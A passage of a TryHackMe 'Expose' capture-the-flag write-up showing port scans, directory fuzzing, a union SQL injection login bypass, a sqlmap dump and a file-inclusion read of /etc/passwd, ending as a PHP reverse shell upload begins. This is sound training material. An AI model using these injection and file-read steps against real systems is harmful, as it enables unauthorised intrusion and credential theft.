+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -sC -sV -p- 10.10.229.207
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-01-28 07:58 EST
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.229.207
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.055s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65530</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE                 VERSION
+</span></span><span class=line><span class=cl>21/tcp   open  ftp                     vsftpd 2.0.8 or later
+</span></span><span class=line><span class=cl><span class=p>|</span>_ftp-anon: Anonymous FTP login allowed <span class=o>(</span>FTP code 230<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ftp-syst:
+</span></span><span class=line><span class=cl><span class=p>|</span>   STAT:
+</span></span><span class=line><span class=cl><span class=p>|</span> FTP server status:
+</span></span><span class=line><span class=cl><span class=p>|</span>      Connected to ::ffff:10.11.65.91
+</span></span><span class=line><span class=cl><span class=p>|</span>      Logged in as ftp
+</span></span><span class=line><span class=cl><span class=p>|</span>      TYPE: ASCII
+</span></span><span class=line><span class=cl><span class=p>|</span>      No session bandwidth limit
+</span></span><span class=line><span class=cl><span class=p>|</span>      Session timeout in seconds is <span class=m>300</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>      Control connection is plain text
+</span></span><span class=line><span class=cl><span class=p>|</span>      Data connections will be plain text
+</span></span><span class=line><span class=cl><span class=p>|</span>      At session startup, client count was <span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>      vsFTPd 3.0.3 - secure, fast, stable
+</span></span><span class=line><span class=cl><span class=p>|</span>_End of status
+</span></span><span class=line><span class=cl>22/tcp   open  ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey:
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 9c:ef:fe:df:c3:55:d8:25:47:76:64:01:dc:93:53:50 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> c9:45:fb:a7:e9:ae:2c:48:46:8f:86:82:64:a0:20:d0 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 9b:25:8f:19:62:39:c6:05:ef:e5:f6:02:3f:c0:12:30 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>53/tcp   open  domain                  ISC BIND 9.16.1 <span class=o>(</span>Ubuntu Linux<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> dns-nsid:
+</span></span><span class=line><span class=cl><span class=p>|</span>_  bind.version: 9.16.1-Ubuntu
+</span></span><span class=line><span class=cl>1337/tcp open  http                    Apache httpd 2.4.41 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: EXPOSED
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>1883/tcp open  mosquitto version 1.6.9
+</span></span><span class=line><span class=cl><span class=p>|</span> mqtt-subscribe:
+</span></span><span class=line><span class=cl><span class=p>|</span>   Topics and their most recent payloads:
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/bytes/received/5min: 13.55
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/publish/bytes/sent: <span class=m>63</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/sockets/5min: 0.57
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/clients/inactive: <span class=m>0</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/messages/sent/1min: 13.71
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/retained messages/count: <span class=m>35</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/bytes/sent/1min: 406.59
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/sockets/15min: 0.20
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/clients/disconnected: <span class=m>0</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/messages/received: <span class=m>3</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/store/messages/bytes: <span class=m>149</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/bytes/sent: <span class=m>445</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/messages/received/1min: 2.74
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/bytes/received/15min: 4.57
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/bytes/received: <span class=m>69</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/heap/maximum: <span class=m>51456</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/messages/sent/15min: 0.99
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/publish/sent/1min: 10.96
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/connections/5min: 0.39
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/publish/messages/sent: <span class=m>12</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/messages/received/5min: 0.59
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/clients/maximum: <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/clients/connected: <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/messages/sent: <span class=m>15</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/connections/15min: 0.13
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/uptime: <span class=m>132</span> seconds
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/messages/stored: <span class=m>32</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/publish/sent/15min: 0.80
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/clients/active: <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/clients/total: <span class=m>1</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/publish/sent/5min: 2.36
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/subscriptions/count: <span class=m>2</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/store/messages/count: <span class=m>32</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/version: mosquitto version 1.6.9
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/messages/sent/5min: 2.95
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/bytes/sent/15min: 29.49
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/messages/received/15min: 0.20
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/connections/1min: 1.83
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/sockets/1min: 2.43
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/load/bytes/received/1min: 63.04
+</span></span><span class=line><span class=cl><span class=p>|</span>     <span class=nv>$SYS</span>/broker/heap/current: <span class=m>51056</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_    <span class=nv>$SYS</span>/broker/load/bytes/sent/5min: 87.39
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 56.47 seconds
+</span></span></code></pre></td></tr></table></div></div><p>We already got some important information:</p><ul><li>FTP server on port 21 with anonymous login allowed,</li><li>There is a dns server,</li><li>A web page on port 1337,</li><li>And mosquitto is running on port 1883.</li></ul><p>The web page just shows the name of the room.</p><p>We can start a fuzzer for subdirectory enumeration:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u <span class=s1>&#39;http://10.10.229.207:1337/FUZZ&#39;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/
+</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/
+</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\
+</span></span></span><span class=line><span class=cl><span class=se></span>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       v2.1.0-dev
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> :: Method           : GET
+</span></span><span class=line><span class=cl> :: URL              : http://10.10.229.207:1337/FUZZ
+</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
+</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
+</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>admin                   <span class=o>[</span>Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>javascript              <span class=o>[</span>Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 59ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>phpmyadmin              <span class=o>[</span>Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 58ms<span class=o>]</span>
+</span></span></code></pre></td></tr></table></div></div><p>Admin seems like a fake page, I tried to type some emails and password and I don’t receive any response, so the real one must be phpmyadmin.</p><p>After I tried using default credentials, I tried going back to the enumeration part and using a bigger wordlist, and I actually found another directory:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u <span class=s1>&#39;http://10.10.229.207:1337/FUZZ&#39;</span> -w /usr/share/wordlists/dirb/big.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/
+</span></span><span class=line><span class=cl>       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/
+</span></span><span class=line><span class=cl>         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\
+</span></span></span><span class=line><span class=cl><span class=se></span>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       v2.1.0-dev
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> :: Method           : GET
+</span></span><span class=line><span class=cl> :: URL              : http://10.10.229.207:1337/FUZZ
+</span></span><span class=line><span class=cl> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
+</span></span><span class=line><span class=cl> :: Follow redirects : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Calibration      : <span class=nb>false</span>
+</span></span><span class=line><span class=cl> :: Timeout          : <span class=m>10</span>
+</span></span><span class=line><span class=cl> :: Threads          : <span class=m>40</span>
+</span></span><span class=line><span class=cl> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span></span><span class=line><span class=cl>________________________________________________
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>.htpasswd               <span class=o>[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 2901ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>.htaccess               <span class=o>[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 3911ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>admin                   <span class=o>[</span>Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>admin_101               <span class=o>[</span>Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 56ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>javascript              <span class=o>[</span>Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 55ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>phpmyadmin              <span class=o>[</span>Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 54ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>server-status           <span class=o>[</span>Status: 403, Size: 280, Words: 20, Lines: 10, Duration: 57ms<span class=o>]</span>
+</span></span><span class=line><span class=cl>:: Progress: <span class=o>[</span>20469/20469<span class=o>]</span> :: Job <span class=o>[</span>1/1<span class=o>]</span> :: <span class=m>704</span> req/sec :: Duration: <span class=o>[</span>0:00:33<span class=o>]</span> :: Errors: <span class=m>0</span> ::
+</span></span></code></pre></td></tr></table></div></div><p>And we got something valueable:</p><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled.png loading=lazy alt=Untitled></p><p>First of all now we know that the domain is root.thm,</p><p>we can change that by editing the /etc/hosts file:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>127.0.0.1       localhost
+</span></span><span class=line><span class=cl>127.0.1.1       kali
+</span></span><span class=line><span class=cl>10.10.229.207   root.thm
+</span></span></code></pre></td></tr></table></div></div><p>And we can now navigate with the dns name:</p><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%201.png loading=lazy alt=Untitled></p><p>That’s good because now we can start fuzzing the subdomains.</p><p>After trying for some time, I ended up with nothing, so I am going to try brute forcing the login panel instead.</p><p>This also didn’t seem to go anywhere, so maybe I could try with sql injection.</p><p>I tried to put a comment: <code>— -</code></p><p>And I got an error message:</p><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%202.png loading=lazy alt=Untitled></p><p>After trying to do something manually,</p><p>and I managed to enter into the application using an union sql</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hacker<span class=err>&#39;</span> union <span class=k>select</span> null,null,null,null#
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%203.png loading=lazy alt=Untitled></p><p>I don’t really care about the application, but I could use this union sql to gain some credentials.</p><p>After trying for a while, I didn’t manage to reflect the output of the message so that was useless.</p><p>I eventually switched to sqlmap:</p><p>First of all I captured the request in a file using BURP</p><p>and then I used sqlmap to dump the database:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sqlmap -r req.txt -dump
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>id</th><th>email</th><th>created</th><th>password</th></tr></thead><tbody><tr><td>1</td><td><a class=link href=mailto:hacker@root.thm>hacker@root.thm</a></td><td>2023-02-21 09:05:46</td><td><redacted></td></tr></tbody></table></div><p>And I found his password.</p><p>I also found two more interesting things:</p><div class=table-wrapper><table><thead><tr><th>id</th><th>url</th><th>password</th></tr></thead><tbody><tr><td>1</td><td>/file1010111/index.php</td><td><redacted>(<redacted>)</td></tr><tr><td>3</td><td>/upload-cv00101011/index.php</td><td>// ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z</td></tr></tbody></table></div><p>We can navigate to the first url and put the password found with the sqlmap scan:</p><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%204.png loading=lazy alt=Untitled></p><p>The site just says:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Parameter Fuzzing is also important :<span class=o>)</span> or Can you hide DOM elements?
+</span></span></code></pre></td></tr></table></div></div><p>Apparently the parameter in question is “?file”</p><p>So maybe we can use that to read files in the system:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+</span></span><span class=line><span class=cl>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>pollinate:x:111:1::/var/cache/pollinate:/bin/false
+</span></span><span class=line><span class=cl>ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+</span></span><span class=line><span class=cl>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+</span></span><span class=line><span class=cl>mysql:x:113:119:MySQL Server,,,:/nonexistent:/bin/false
+</span></span><span class=line><span class=cl>zeamkish:x:1001:1001:Zeam Kish,1,1,:/home/zeamkish:/bin/bash
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bind:x:115:122::/var/cache/bind:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>Debian-snmp:x:116:123::/var/lib/snmp:/bin/false
+</span></span><span class=line><span class=cl>redis:x:117:124::/var/lib/redis:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mosquitto:x:118:125::/var/lib/mosquitto:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>fwupd-refresh:x:119:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+</span></span></code></pre></td></tr></table></div></div><p>And it worked, so now we have the password for the second page:</p><p>which is the user zeamkish.</p><p>Now we can upload a file:</p><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%205.png loading=lazy alt=Untitled></p><p>And after uploading a file we can go to the source code to see where it is stored:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;h1&gt;File uploaded successfully! Maybe look in <span class=nb>source</span> code to see the path&lt;span <span class=nv>style</span><span class=o>=</span><span class=s2>&#34; display: none;&#34;</span>&gt;in /upload_thm_1001 folder&lt;/span&gt; &lt;h1&gt;
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://raw.githubusercontent.com/SimoneFelici/Expose-writeup-THM/main/4ca36771-eb73-4388-a0ae-5541d4fc580b_Export-7a75593e-3439-4e58-bca6-e041ad0479ff/Expose%208862d9d2d64c447b9983bf0fafb7c8f6/Untitled%206.png loading=lazy alt=Untitled></p><p>And it was in fact in the http://10.10.229.207:1337/upload-cv00101011/upload_thm_1001/ folder.</p><p>Now I took the pentestermonkey php reverse shell, and tried to upload it, but it doesn’t do anything, this is because of this function:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
